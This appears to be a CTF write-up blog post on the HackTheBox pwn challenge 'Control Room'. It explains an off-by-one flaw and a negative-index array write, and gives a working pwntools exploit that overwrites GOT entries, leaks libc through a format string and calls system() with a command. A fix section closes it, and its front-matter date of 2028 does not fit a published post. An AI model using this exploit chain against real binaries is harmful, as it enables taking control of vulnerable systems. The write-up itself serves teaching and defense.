---
layout: post
title: "Control Room"
date: 2028-02-27 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, oob-write, got-overwrite, format-string, no-pie, off-by-one, glibc]
description: "A signed array index checked only on the top end gives an arbitrary write below the array — straight onto the GOT of a No-PIE binary. No ROP, no shellcode: hijack exit to a re-prompting function, turn puts into printf for a libc leak, then strlen into system, and run a command through the username field."
---

## Overview

Control Room is a Medium pwn challenge from Cyber Apocalypse 2023. The binary is **No-PIE** with a **writable GOT** (Partial RELRO), a stack canary and NX — but none of those mitigations matter, because the exploit never touches a saved return address. It's a pure data-only **GOT-hijack** chain built out of a single out-of-bounds array write, turning the program's own library calls into a libc leak and then a shell command.

## The technique

Two bugs combine.

**An off-by-one NUL overflow** in the username editor writes a terminating `\0` one byte past the buffer, landing on the adjacent *role* field and promoting you to the privileged **Captain** — which unlocks the rest of the menu.

**A signed out-of-bounds write** in the engine configurator is the real primitive. The index is read as a signed value and only bounds-checked on the *top*:

```c
if (idx > 3) reject();
engines[idx] = (thrust, mixture);   // engines = 0x405120, 16-byte elements
```

A negative `idx` writes 16 attacker-controlled bytes *below* the array base — an [out-of-bounds write (CWE-787)](https://cwe.mitre.org/data/definitions/787.html) driven by an [improperly validated array index (CWE-129)](https://cwe.mitre.org/data/definitions/129.html). Because the binary is No-PIE, `engines` sits at a fixed `0x405120`, so `0x405120 + idx*16` lands exactly on GOT entries:

| idx | target |
|-----|--------|
| -7  | `exit` GOT |
| -2  | `curr_user` pointer |
| -16 | `strncpy` / `puts` GOT |
| -14 | `strlen` / `__stack_chk_fail` GOT |

## Solution

The chain never uses ROP or shellcode — every step reprograms one GOT entry:

```python
def ow(idx, thrust, mixture):          # OOB write engines[idx] = (thrust, mixture)
    io.sendlineafter(b"Option [1-5]:", b"1")
    io.sendlineafter(b"Engine number [0-3]:", str(idx).encode())
    io.sendlineafter(b"Thrust:", str(thrust).encode())
    io.sendlineafter(b"Mixture ratio:", str(mixture).encode())
    io.sendlineafter(b"(y/n)", b"y")

# 1. off-by-one -> Captain, then set role to Technician (reaches configure_engine)
# 2. exit GOT -> user_register: a re-prompting function = repeatable, NUL-free write
ow(-7,  0x40170c, 0)
# 3. curr_user pointer -> a global that print_banner puts()'s
ow(-2,  0x4053b8, 0)
# 4. puts GOT -> printf (keep strncpy intact): puts(global) becomes a format string
ow(-16, 0x401040, 0x4011e0)

# 5. leak libc through the hijacked puts->printf
io.sendlineafter(b"Option [1-5]:", b"6")               # "exit" -> user_register
io.sendlineafter(b"Enter a username:", b"&" + b"%p_"*83 + b"&")
leak = int(io.recvuntil(b"&").split(b"_")[2], 16)
libc = leak - 0x114a37                                  # page-aligned -> verified
system = libc + 0x50d60

# 6. strlen GOT -> system (keep __stack_chk_fail intact)
ow(-14, system, 0x401090)

# 7. trigger: user_register does strncpy(curr_user, name); strlen(curr_user)
#    which is now system(curr_user). The username IS the argument.
io.sendlineafter(b"Option [1-5]:", b"6")
io.sendlineafter(b"Enter a username:", b"cat flag.txt #")   # system("cat flag.txt #")
```

A useful practical detail: `system("/bin/sh")` returns as soon as the `sh -c` finishes, so an *interactive* shell often yields nothing over a raw socket. Passing a **direct command** as the username (`cat flag.txt #`, where `#` comments out any trailing bytes) is the reliable way to read the flag. The leaked libc base came back page-aligned, confirming the fixed leak offset, and `system` was `libc_base + 0x50d60`. The program prints `HTB{...}`.

## Why it worked

The engine index was validated on only one end, so a negative value reached memory below the array ([CWE-129](https://cwe.mitre.org/data/definitions/129.html)). Combined with a **No-PIE binary whose GOT is writable**, that arbitrary write becomes total control: overwrite `exit` to get a repeatable clean write, `puts` to leak libc through a [format string (CWE-134)](https://cwe.mitre.org/data/definitions/134.html), and `strlen` to call `system`. The stack canary, NX, and even the off-by-one's normal use as a stack-smash are all irrelevant — the attack lives entirely in the GOT and global data.

## Fix / defense

- **Bounds-check the index on both ends**: `if (idx < 0 || idx > 3) reject;`.
- **Build with Full RELRO** (`-Wl,-z,relro,-z,now`) so the GOT is mapped read-only — this single change breaks the entire hijack chain.
- Terminate strings inside the buffer, never at `buf[size]`, to kill the off-by-one role flip.
